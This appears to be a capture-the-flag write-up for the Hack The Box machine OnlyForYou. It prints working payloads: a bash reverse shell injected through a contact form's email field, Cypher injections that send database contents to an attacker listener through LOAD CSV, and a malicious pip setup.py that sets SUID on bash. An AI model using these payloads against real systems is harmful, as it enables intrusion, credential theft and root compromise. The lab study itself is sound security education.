---
layout: post
title: "HTB: OnlyForYou"
subtitle: "LFI to source leak, dig command injection for a shell, Cypher injection for creds, then a malicious pip sdist to root"
date: 2023-04-30
tags: [htb, linux, lfi, command-injection, cypher-injection, pip]
category: writeups
tldr: "A weak path-traversal check on beta.only4you.htb leaks the app source. form.py runs dig with shell=True, so I inject through the email field for a shell as www-data. An internal neo4j is hit with Cypher injection to dump john's hash (ThisIs4You), and sudo pip3 download of an attacker-hosted sdist runs setup.py as root for the escape."
---

## the box

OnlyForYou is a Linux box on `only4you.htb`. nmap:

```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http  nginx 1.18.0 (Ubuntu)
```

The main site mentions beta products at `http://beta.only4you.htb`, a second vhost that hands out its own source code.

## recon

The beta app exposes image tools (`/resize`, `/convert`, `/list`, `/download`, `/source`). The `/download` route tries to block path traversal but the check is shallow:

```python
filename = posixpath.normpath(image)
if '..' in filename or filename.startswith('../'):
    flash('Hacking detected!', 'danger')
    return redirect('/list')
if not os.path.isabs(filename):
    filename = os.path.join(app.config['LIST_FOLDER'], filename)
```

It only rejects `..` and a `../` prefix. An absolute path sails right through, so `image=/etc/passwd` is a clean LFI. That listed the interesting users: `dev`, `john`, `root`, plus `neo4j`.

I used the LFI to read config and source, pulling `/etc/nginx/sites-enabled/default` to map the vhosts, then the main app's `app.py` and its `form.py`.

## foothold

`form.py` builds a `dig` command from the email domain and runs it with `shell=True`:

```python
domain = email.split("@", 1)[1]
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```

The domain comes straight from the contact form's `email` field, so anything after the `@` is shell-injected. I confirmed it locally first, then posted to the contact endpoint with a command appended:

```
name=test&email=tester%40mailroom.htb%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.147/8085+0>%261'&subject=eztzet&message=zeteztzet
```

That gave a reverse shell as `www-data`.

## user

Locally I found neo4j listening on 7687 and an internal Gitea, plus a web app on 8001 and 3000. I pivoted those ports back to my box:

```
client 10.10.16.5:8000 R:8001:127.0.0.1:8001 R:3000:127.0.0.1:3000
```

The internal app logs in with `admin:admin`, and its `/search` endpoint is vulnerable to Cypher injection. Neo4j has no `UNION`-style exfil, so I used `LOAD CSV` to call back to my listener and leak data piece by piece.

Version first:

```
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.16.5:9999/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

Then labels (`user` and `employee`):

```
' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.5:9999/?label='+label as l RETURN 0 as _0 //
```

Then the properties of the `user` nodes:

```
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.5:9999/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

My HTTP handler caught the usernames and password hashes. Cracking john's hash gave `ThisIs4You`:

```bash
ssh john@only4you.htb   # ThisIs4You
```

That is the user flag.

## root

`sudo -l` as john:

```
/usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

john can run `pip3 download` as root against a tarball served from the internal Gitea on 3000. `pip download` of an sdist still executes the package's `setup.py`, so a malicious source distribution runs arbitrary code as root. The package sets SUID on bash:

```python
def RunCommand():
    os.system("chmod u+s /bin/bash")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)
```

Build it, push it to a Gitea repo, and have root pull it:

```bash
python3 setup.py sdist
sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Backage/raw/master/Backage-0.1.tar.gz
```

After that `/bin/bash` carries the SUID bit, and `bash -p` gives a root shell. That is the root flag.

## takeaway

The path-traversal check fails because it only thinks about `..` and forgets absolute paths, which is enough to leak the whole app and find the real bug. Building shell strings from user input with `shell=True` is the foothold, and Cypher injection plus `LOAD CSV` turns a search box into an out-of-band exfil channel. The privesc is the well-known `pip download` setup.py execution: downloading is not safe, because building an sdist runs its code.
